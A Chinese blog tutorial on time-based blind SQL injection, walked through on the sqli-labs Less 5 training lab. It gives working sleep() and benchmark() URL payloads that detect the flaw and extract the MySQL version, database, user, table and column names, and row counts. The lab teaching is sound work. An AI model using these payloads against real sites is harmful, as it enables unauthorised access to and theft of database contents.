---
title: 基于时间的盲注
toc: true
description: 本文使用 sqli less 5 进行基于时间盲注的讲解，介绍其原理，常用函数、payload、流程步骤等。
summary: 本文使用 sqli less 5 进行基于时间盲注的讲解，介绍其原理，常用函数、payload、流程步骤等。
categories:
    - websec
    - sql injection
date: 2019-07-27 22:40:30
tags:
---

一般猜测/尝试顺序：

回显注入（单引号->没引号/双引号->括号->括号与单/双引号）->布尔盲注/报错盲注->时间注入

# 时间盲注简介

所谓延时注入主要针对页面无变化，无法用布尔真假判断，无法报错的情况下注入。延时注入是通过页面返回的时间来判断的。

不同的 mysql 数据库版本，延迟注入语句也不同。
mysql >= 5.0 的可以使用 sleep 进行查询 sleep（5）
mysql < 5.0 的可以使用 benchmark( )进行查询 select benchmark(1000,select \* from admin);

# 时间盲注常用函数

1. sleep(n)延长查询时间，延长 n 秒

2. if(exp1,exp2,exp3)如果 exp1 为真，那么执行 exp2，否则执行 exp3.

    比如： if(ascii(substr(version(),1,1))=65,1,sleep(5))

    如果当前数据库版本的第一个字符的 ascii 码为 65，那么正常执行，否则程序等待三秒再执行。

# 检测注入点

先进行前面的一堆可能的注入特征检测，都没有后，可以使用一下注入语句，通过判断页面是否出现延迟来检测是否存在延时注入。

?id=1 and sleep(3) --+

?id=1 and if(1=1,1,sleep(3))

?id=1 and if(1=2,1,sleep(3))

一般，用第一个就能检测出来

# 注入流程

注入流程是和布尔盲注差不多，除了多用了一个 if () 和 sleep 语句，没别的。

### 注入版本

```php
?id=1' and if(left(version(),3)>'5.5',1,sleep(5)) --+
?id=1' and if(left(version(),6)='5.5.53',1,sleep(5)) --+
```

结果：5.5.53

### 注入当前数据库

```php
?id=1' and if(ascii(substr(database(),1,1))=116,1,sleep(5)) --+
?id=1' and if(ascii(substr(database(),2,1))>100,1,sleep(5)) --+
```

一个字符字符的注入，最终，数据库名：security

### 注入当前用户

```php
?id=1' and if(ascii(substr(user(),1,1))>113,1,sleep(3)) --+
```

一个个注入，这里不再演示，结果应该是：root@localhost。

### 当前数据库下的表的个数

```php
?id=1' and if((select count(table_name) from information_schema.tables where table_schema='security')>3,1,sleep(3)) --+
```

4 个表

### 当前数据库下的表名

```php
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>102,1,sleep(3)) --+
```

猜到一半，我感觉是 email，然后验证。

```php
?id=1' and if(left((select table_name from information_schema.tables where table_schema='security' limit 0,1),5)='email',1,sleep(3)) --+
```

验证成功，表名：emails，同理猜测出其他表名: referers，uagents，users

### email 的字段名

```
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),2,1))>100,1,sleep(3)) --+
```

第一个字段：id，然后类推。

### users 表中记录的个数

```php
?id=1' and if((select count(*) from users)>13,1,sleep(3)) --+
```

​ 13 条记录

# benchmark 函数

除了 sleep 函数能够产生延时以外，benchmark 函数同样能够达到类似效果，使用方法也是类似的，一般在 sleep 用不了的时候，试试 benchmark

BENCHMARK(count,expr)用于测试函数的性能，参数一为执行次数，二为要执行的表达式。

可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。

比如：可以在 mysql cmd 执行：select benchmark(5000000, md5('helloworld'));

如果觉得慢，可以使用：select benchmark(5000000, sha('helloworld'));

计算 sha 摘要比计算 md5 摘要费时间。

举例

```php
?id=1' and if((select count(*) from users)>19,1,benchmark(2000000,sha('hello'))) --+
```

我一般使用 benchmark(2000000,sha('hello'));

# 总结回顾

1. limit 下标是从 0 开始，substr 下标是从 1 开始
